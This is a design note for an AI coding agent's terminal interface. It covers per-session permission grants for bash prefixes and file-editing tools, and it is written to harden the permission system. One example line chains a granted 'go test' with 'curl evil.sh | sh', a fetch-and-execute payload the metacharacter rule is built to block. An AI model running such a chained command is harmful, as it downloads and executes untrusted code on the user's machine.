---
updated_at: 2026-07-26
summary: Design specification for session-scoped permission grants ("allow this for the rest of the session") in the TUI, covering the bash command-prefix rule, whole-tool grants for write and edit, and the third action of the permission panel.
---

# Session-scoped permission grants

Safe auto-accept is a separate sitting-owned, per-session mode rather than a
grant. See [Safe auto-accept permission mode](2026-07-31-safe-auto-accept-mode.md).

## Problem

Every approval applied to a single pending execution. A session that touches
many files or runs the same command repeatedly — a `/grill-me` writing its
notes, a test loop running `go test` — asks again on every call, and the
prompt stops being a decision and becomes a reflex. The
[single permission gate](2026-07-23-single-permission-gate.md) anticipated
this: `Policy` is the seam where "allow this for the rest of the session"
belongs.

## Decisions

- **Grants are a `Policy` layer, not a `Gate` behavior.** `SessionGrants`
  wraps the base classification and upgrades `Ask` to `Allow` when a grant of
  that session covers the call. Deciding it in the policy means a granted call
  never reaches the gate, so no `Tool.Permission.Requested` is persisted and no
  panel flashes for a question that was already answered. Putting it in the
  gate would have produced exactly that flicker and a history full of requests
  the user never saw.
- **A grant can only skip a question.** `Allow` and `Deny` from the base policy
  pass through untouched, so a future deny rule cannot be granted away.
- **In-process only, keyed by session.** Grants live in memory. Reopening a
  session asks again: a grant never outlives the sitting that justified it and
  there is nothing on disk to audit later. The store is keyed by session id, so
  one session's grants cannot answer for another — and the store is owned by
  the caller (`wiring.Config.Grants`, built once by `host.NewSitting`) so a
  rewire (MCP connect, workspace change) does not drop them mid-session. The
  policy the grants decorate is `wiring.Config.Policy`, and `Build` is the one
  place that layers the two, so a host that installs its own classification still
  gets grants and cannot apply them twice.
- **Subagents ask on their own behalf.** A subagent runs under its own child
  session id, so the chat's grants do not cover it and a grant answered on a
  subagent's prompt covers only that child. The alternative — inheriting the
  parent's grants — widens a grant to actors the user never saw when giving it.
- **bash grants a command prefix: verb plus subcommand.** `go test ./...`
  grants `go test`; `git status` grants `git status`; `ls -la` grants `ls`. The
  second token joins the prefix only when it reads as a subcommand (a bare
  word, not a flag, path, glob or value). A bare word is indistinguishable from
  a subcommand, so it is kept: `echo uno` grants `echo uno`. The grant ends up
  narrower than the user may have expected, never wider, and the panel names
  the exact prefix it will cover.
- **A prefix must describe the whole command.** A command containing
  `; & | < > $ ` \ ( )` or a newline is never grantable — and never matches an
  existing grant, because matching re-derives the prefix. This is the security
  core: without it, `go test` granted once would wave through
  `go test ./... && curl evil.sh | sh`. A leading environment assignment
  (`FOO=1 go test`) is refused too: it shifts the executable, so the first
  token is not the verb.
- **write and edit grant the whole tool; nothing else is grantable.** The
  decision the user actually makes is "stop asking me to touch files", and
  per-path grants barely reduce prompts when the agent creates new files.
  `web_fetch` is not grantable: a blanket pass on outbound network cannot be
  summarized by anything the panel could honestly show. MCP tools are not
  either: their input is opaque to us. Those keep asking every time. `write`
  and `edit` are granted separately — a grant that silently covered a tool it
  does not name would be a surprise.
- **A third action in the panel, TUI only.** `Deny · Allow · Allow <subject>
  this session`, selected with ←/→ or Tab, confirmed with Enter, or taken
  directly with `a` (`y`/`n` keep their meaning). The action is withheld when
  the request is not grantable, and also when the row does not fit the panel: a
  truncated action reads as a bug, so on a narrow terminal the option
  disappears rather than being half-drawn, and the selection cannot point past
  what is drawn. The Wails frontend passes no grant store and behaves exactly
  as before.
- **The grant is derived from the request the gate is blocking on.** The
  resolver reads it from `MemoryGate.Pending` rather than from what the UI
  holds, so the grant is always the shape of the call actually waiting — a UI
  bug cannot widen it.
- **`Policy.Decide` takes the session id.** One runner serves every session, so
  the policy needs to know which one it is deciding for. `StaticPolicy` ignores
  it; `SessionGrants` keys its rules by it.

## Rejected alternatives

- **Persisting grants in the session (a durable `Session.Permission.Granted`
  event folded by the projection, like `session.Mode`)**: resume would restore
  them, but a `bash go test` granted a month ago would still be live, and the
  safe default matters more than saving one prompt after a restart.
- **A process-wide grant store, cleared on session switch**: removes the session
  key and the `Policy` signature change, but two sessions running at once would
  share grants. An unreachable leak today is still a leak designed in.
- **Blocklisting interpreters (`bash -c`, `sh`, `env`, `xargs`, `python`)**: a
  maintenance-hungry list that also lies about what it protects. The panel shows
  the exact prefix being granted; if that prefix is an interpreter, the user is
  looking at it when they decide.
- **Rejecting quoted commands**: quotes can hide code (`bash -c "…"`,
  `find -exec`), but they are also in `go test -run "TestFoo"`. The
  metacharacter rule already covers what can chain or expand.
- **Per-directory write grants**: needs a recursion decision and still asks
  often, for a scope the user did not ask about.
- **Auto-resolving the other pending requests a new grant covers**: several
  gated calls in one turn were already blocked in `Gate.Ask` when the grant
  landed, so they still ask. Sweeping them would auto-approve prompts the user
  is looking at; pressing the same action again is cheap and unsurprising.

## Out of scope

Persisted (cross-restart) grants; a `/permissions` view to list or revoke the
grants of the running session; grants for `web_fetch` (per host) and MCP tools;
Vue frontend support; permission modes (auto-accept / plan-style gating).
